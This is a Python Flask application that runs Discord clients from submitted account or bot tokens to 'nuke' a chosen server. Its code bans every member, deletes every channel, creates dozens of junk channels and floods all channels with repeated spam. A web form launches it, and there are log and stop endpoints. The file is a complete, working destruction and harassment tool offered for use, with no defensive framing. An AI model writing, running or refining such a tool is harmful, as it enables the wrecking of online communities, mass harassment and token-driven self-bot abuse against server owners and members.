import traceback, threading, datetime, asyncio, discord, random, string
from flask import Flask, request, redirect, render_template

app = Flask(__name__)

logs = {}
stops = []


class DiscordBot(discord.Client):
    def __init__(self, logId:str, token:str, id:int, name:str, latency:int, message:str, option:list[bool], mode:int):
        super().__init__()
        self.logId = logId
        self.token = token
        
        # DmNukeもServerNukeも呼び出されるから、idとかnameっていう抽象的な名前にしている
        self.guildId = self.userId = id
        self.channelName = self.groupName = name
        
        self.nukeLatency = latency
        self.message = message
        if mode == 0:
            self.allUserBan = option[0]
            self.allChannelDelete = option[1]
        self.mode = mode
    async def banUser(self, user:discord.Member):
        try:
            await user.ban(reason="Fuck Server User")
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" | {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
    async def deleteChannel(self, channel:discord.abc.GuildChannel):
        try:
            await channel.delete()
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" | {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
    async def sendMessage(self, message:str, channel:discord.TextChannel, latencyMs:float):
        try:
            await channel.send(message)
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "[-]Failed"
            self.channels.remove(channel)
        logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
        await asyncio.sleep(latencyMs)
    async def banAllUser(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllUserBan ----\n"
        await asyncio.gather(*(self.banUser(member) for member in guild.members))
        logs[self.logId] += "---- End ----\n\n\n"
    async def deleteAllChannel(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllChannelDelete ----\n"
        await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
        logs[self.logId] += "---- End ----\n\n\n"
    async def createChannel(self, channelName:str, guild:discord.Guild):
        channelName = channelName+"-"+"".join(random.choice(string.ascii_lowercase) for _ in range(10))
        await guild.create_text_channel(channelName)
    async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=50):
        logs[self.logId] += "---- Start Nuke ----\n"
        try:
            if self.allChannelDelete:
                await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
            self.channels = list(guild.channels)
            random.shuffle(self.channels)
            for _ in range(numberOfExecutions):
                if self.logId in stops:
                    logs.pop(self.logId)
                    await self.close()
                    return
                logs[self.logId] += "--- Nuke ---\n"
                for channel in self.channels:
                    bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))
                    await self.sendMessage(bMessage, channel, latency*0.001)
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
        logs[self.logId] += "---- End ----\n"
        await self.close()
    async def on_ready(self):
        logs[self.logId] += f"ID:{self.user.id}, Name:{self.user.name}\n\n"
        if self.mode == 0:
            self.guild = self.get_guild(self.guildId)
            if not self.guild:
                logs[self.logId] += f"Error: The server you entered has not been joined by a bot."
                await self.close()
                return
            try:
                i = self.guild.get_member(self.user.id)
                await i.edit(nick="឵᠎")
            except:
                pass
            if self.allUserBan:
                await self.banAllUser(self.guild)
            if self.allChannelDelete:
                await self.deleteAllChannel(self.guild)
            await self.nuke(self.nukeLatency, self.message, self.guild, self.channelName)
    async def on_message(self, message):
        if message.author.bot:
            return
    def runBot(self):
        try:
            self.run(self.token, reconnect=True)
        except:
            logs[self.logId] += f"Error:\n{traceback.format_exc()}"


@app.route('/getLog', methods=["GET"])
def getLog():
    if request.args.get("id") in logs:
        return render_template('getLog.html', log=logs[request.args.get("id")])
    else:
        return render_template('getLog.html', log="Not found"), 404

@app.route('/stop', methods=["GET"])
def stop():
    stops.append(request.args.get("id"))
    return redirect('nuke')

@app.route('/nuke', methods=["GET", "POST"])
def nuke():
    if request.method == "POST":
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Nuke PPP\n\n"

        tokens = request.form.getlist('token')
        guildId = int(request.form["guildId"])
        channelName = request.form["channelName"]
        latency = int(request.form["latency"])
        message = request.form["message"]
        allUserBan = "allUserBan" in request.form
        allChannelDelete = "allChannelDelete" in request.form
        
        logs[logId] += f"""-- Value you entered --
Tokens:{tokens}
ServerID:{guildId}
ChannelName:{channelName}
Latency:{latency}ms, {latency*0.001}s
-- Options --
AllUserBan:{allUserBan}
AllChannelDelete:{allChannelDelete}

"""
        
        for token in tokens:
            bot = DiscordBot(logId, token, guildId, channelName, latency, message, [allUserBan, allChannelDelete], 0)
            botThread = threading.Thread(target=bot.runBot, daemon=True)
            botThread.start()
        return render_template('selfBotNuke.html', logId=logId)
    return render_template('selfBotNuke.html')

def main():
    port = 8081
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    main()